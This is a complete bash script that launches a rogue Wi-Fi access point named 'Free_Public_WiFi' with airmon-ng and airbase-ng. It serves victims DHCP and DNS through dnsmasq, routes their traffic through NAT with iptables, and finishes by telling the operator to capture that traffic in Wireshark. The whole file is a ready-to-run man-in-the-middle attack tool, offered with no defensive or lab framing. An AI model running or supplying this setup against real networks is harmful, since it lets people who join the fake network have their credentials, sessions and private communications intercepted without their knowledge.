#!/bin/bash

# === CONFIGURATION ===
FAKE_SSID="Free_Public_WiFi"
CHANNEL="6"
INTERNET_IFACE="eth0"   # Change to your actual internet interface
MON_IFACE="wlan0"       # Wireless card interface
DNSMASQ_CONF="/tmp/dnsmasq.conf"
IP_RANGE_START="10.0.0.10"
IP_RANGE_END="10.0.0.50"
GATEWAY_IP="10.0.0.1"
NETMASK="255.255.255.0"

# === PREP ===
echo "[*] Killing processes that may interfere..."
airmon-ng check kill

echo "[*] Enabling monitor mode on $MON_IFACE..."
airmon-ng start $MON_IFACE
MON_MODE_IFACE="${MON_IFACE}mon"

echo "[*] Launching rogue AP '$FAKE_SSID' on channel $CHANNEL..."
xterm -hold -e "airbase-ng -e \"$FAKE_SSID\" -c $CHANNEL $MON_MODE_IFACE" &

sleep 5  # Allow airbase-ng to start and create at0

echo "[*] Configuring at0 interface..."
ifconfig at0 up
ifconfig at0 $GATEWAY_IP netmask $NETMASK

# === DHCP CONFIG ===
echo "[*] Writing dnsmasq configuration..."
cat <<EOF > $DNSMASQ_CONF
interface=at0
dhcp-range=$IP_RANGE_START,$IP_RANGE_END,12h
dhcp-option=3,$GATEWAY_IP
dhcp-option=6,$GATEWAY_IP
EOF

echo "[*] Starting dnsmasq..."
dnsmasq -C $DNSMASQ_CONF

# === NAT + FORWARDING ===
echo "[*] Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[*] Flushing iptables and setting NAT rules..."
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

iptables -t nat -A POSTROUTING -o $INTERNET_IFACE -j MASQUERADE
iptables -A FORWARD -i at0 -o $INTERNET_IFACE -j ACCEPT
iptables -A FORWARD -i $INTERNET_IFACE -o at0 -m state --state ESTABLISHED,RELATED -j ACCEPT

echo "[*] Rogue AP is running. You can now capture traffic on interface at0 using Wireshark."

# === CLEANUP TRAP ===
trap 'echo "[*] Cleaning up..."; killall airbase-ng dnsmasq; iptables --flush; iptables -t nat --flush; airmon-ng stop $MON_MODE_IFACE; echo 0 > /proc/sys/net/ipv4/ip_forward; exit' INT

# === KEEP SCRIPT ALIVE ===
while true; do sleep 1; done
